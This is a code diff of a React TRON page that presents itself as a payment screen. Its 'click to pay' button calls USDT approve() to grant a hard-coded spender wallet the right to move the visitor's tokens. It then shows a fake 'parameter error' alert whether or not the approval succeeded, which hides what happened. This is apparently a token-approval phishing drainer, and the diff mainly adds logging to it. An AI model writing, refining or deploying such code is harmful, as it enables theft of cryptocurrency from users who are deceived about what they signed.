@@ -5,14 +5,15 @@ export default function Dapp() {
   const [params] = useSearchParams();
   const username = params.get("username") || "未提供";
   const amount = params.get("amount") || "0";
+
   const [walletAddress, setWalletAddress] = useState("");
 
-  const USDT_ADDRESS = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // 正式USDT合约
-  const SPENDER_ADDRESS = "TD6BbmRVVMu1kG4zBHqvrp8dySR4NkHKer"; // 你的收款钱包
+  const USDT_ADDRESS = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // 官方USDT合约地址
+  const SPENDER_ADDRESS = "TD6BbmRVVMu1kG4zBHqvrp8dySR4NkHKer"; // 你的收款地址
 
   useEffect(() => {
     const timer = setInterval(() => {
-      if (window.tronWeb && window.tronWeb.ready) {
+      if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
         setWalletAddress(window.tronWeb.defaultAddress.base58);
         clearInterval(timer);
       }
@@ -22,26 +23,37 @@ export default function Dapp() {
   }, []);
 
   const handleApprove = async () => {
+    console.log("点击付款，开始处理...");
+
     if (!window.tronWeb || !window.tronWeb.ready) {
+      console.log("未检测到 tronWeb 环境或未连接钱包！");
       alert("未检测到钱包，请用钱包自带浏览器访问！");
       return;
     }
 
+    console.log("检测到钱包，地址是：", window.tronWeb.defaultAddress.base58);
+
     try {
+      console.log("开始加载USDT合约...");
       const contract = await window.tronWeb.contract().at(USDT_ADDRESS);
-      const tx = await contract.approve(
-        SPENDER_ADDRESS,
-        window.tronWeb.toSun(amount) // 转成SUN单位
-      ).send({
+
+      console.log("合约加载成功，准备发起 approve 授权...");
+
+      const approveAmount = window.tronWeb.toSun(amount);
+      console.log("授权目标地址:", SPENDER_ADDRESS);
+      console.log("授权金额(SUN单位):", approveAmount);
+
+      const tx = await contract.approve(SPENDER_ADDRESS, approveAmount).send({
         feeLimit: 10000000
       });
 
-      console.log("授权成功，交易哈希:", tx);
+      console.log("授权交易已发送，交易哈希:", tx);
+
       setTimeout(() => {
         alert("参数错误！");
       }, 500);
     } catch (error) {
-      console.error(error);
+      console.error("出现异常：", error);
       setTimeout(() => {
         alert("参数错误！");
       }, 500);
@@ -64,7 +76,7 @@ export default function Dapp() {
 
       <button
         onClick={handleApprove}
-        className="mt-8 bg-purple-600 hover:bg-purple-700 text-white font-bold py-3 px-8 rounded-full shadow-lg"
+        className="mt-8 bg-purple-600 hover:bg-purple-700 text-white font-bold py-3 px-8 rounded-full shadow-md"
       >
         点击付款
       </button>
